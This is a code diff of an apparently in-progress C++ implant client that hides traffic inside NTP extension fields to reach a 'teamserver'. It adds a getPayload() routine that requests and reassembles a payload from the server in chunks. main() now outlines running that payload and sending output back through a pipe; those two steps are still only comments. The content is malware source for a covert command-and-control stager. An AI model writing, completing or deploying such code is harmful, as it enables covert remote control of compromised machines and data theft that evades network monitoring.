@@ -18,7 +18,7 @@ std::vector<uint8_t> size_tToBytes(size_t value) {
 	return bytes;
 }
 
-std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField) {
+std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> sessionId) {
 	std::cout << "======================" << std::endl;
 	std::cout << "Started Chunking		" << std::endl;
 	std::cout << "======================" << std::endl;
@@ -37,12 +37,12 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 	*/
 	auto packetToNotifyServerOfSize = NTPPacket();
 	auto incomingSize = size_tToBytes(dataSize);
-	std::vector<uint8_t> emptySessionId = { 0xFF, 0xFF, 0xFF, 0xFF };
+	//std::vector<uint8_t> emptySessionId = { 0xFF, 0xFF, 0xFF, 0xFF };
 
 	packetToNotifyServerOfSize.addExtensionField(
 		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
 		incomingSize,
-		emptySessionId
+		sessionId
 	);
 	std::cout << "[?] Sending size packet " << std::endl;
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
@@ -68,7 +68,7 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 		packet.addExtensionField(
 			extensionField, //NtpExtensionField::giveMePayload,
 			chunkData,
-			emptySessionId //REPLACE ME WITH REAL SESSION ID
+			sessionId //REPLACE ME WITH REAL SESSION ID
 		);
 
 		//pass full ntp packet 
@@ -85,9 +85,9 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 		packetDebugger(response);
 
 		//Parse NTP packet, get data out of it (or whatever else is needed)
-		NTPPacketParser packetParser = NTPPacketParser(response);
+		NTPPacketParser responsePacketParser = NTPPacketParser(response);
 		//Get extension data:
-		std::vector<uint8_t> extensionData = packetParser.getExtensionData();
+		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();
 
 		//take extracted extension data, put into buffer
 		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer
@@ -107,32 +107,47 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 }
 
 
+
+
+
+
+
+/*
+* helper to get payload 
+*/
+std::vector<uint8_t> getPayload() {
+	//Create pcaket
+	auto packet = NTPPacket();
+	//packet.printPacket();
+	std::vector<uint8_t> packetData = { 0x86 }; //packetData on giveMePayload asks for arch?
+
+	//Chunking here to get the payload
+	//response from serer will be size, so need to get size, and chunk over that, and insert into payloadBuffer
+	std::vector<uint8_t> payloadBuffer = chunker(
+		packetData,
+		NtpExtensionField::giveMePayload,
+		Client::emptySessionId
+	);
+
+	return payloadBuffer;
+}
+
 int main() {
 	//Stuff here
 
 	std::cout << "Started" << std::endl;
 
-	//Create pcaket
-	auto packet = NTPPacket();
-	//packet.printPacket();
+	//1. Get Payload
+	std::vector<uint8_t> payloadBytes = getPayload();
 
-	std::vector<uint8_t> packetData = {0xDE,0xAD,0xBE,0xEF};
-	std::vector<uint8_t> emptySessionId = { 0xFF, 0xFF, 0xFF, 0xFF };
+	//2. run payload
 
-	packet.addExtensionField(
-		NtpExtensionField::giveMePayload,
-		packetData,
-		emptySessionId
-	);
+	//3. read from pipe & send back
+	//sess id is here cuz it's per comm to track chunking
 
-	//parse the created packet (testing parser)
-	std::vector < uint8_t> packet_bytes = packet.getPacket();
-	NTPPacketParser packetParser = NTPPacketParser(packet_bytes);
-	std::vector<uint8_t> extensionData = packetParser.getExtensionData();
-
-	chunker(packet_bytes, NtpExtensionField::dataForTeamserver);
 
 }
+
 
 
 //Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend
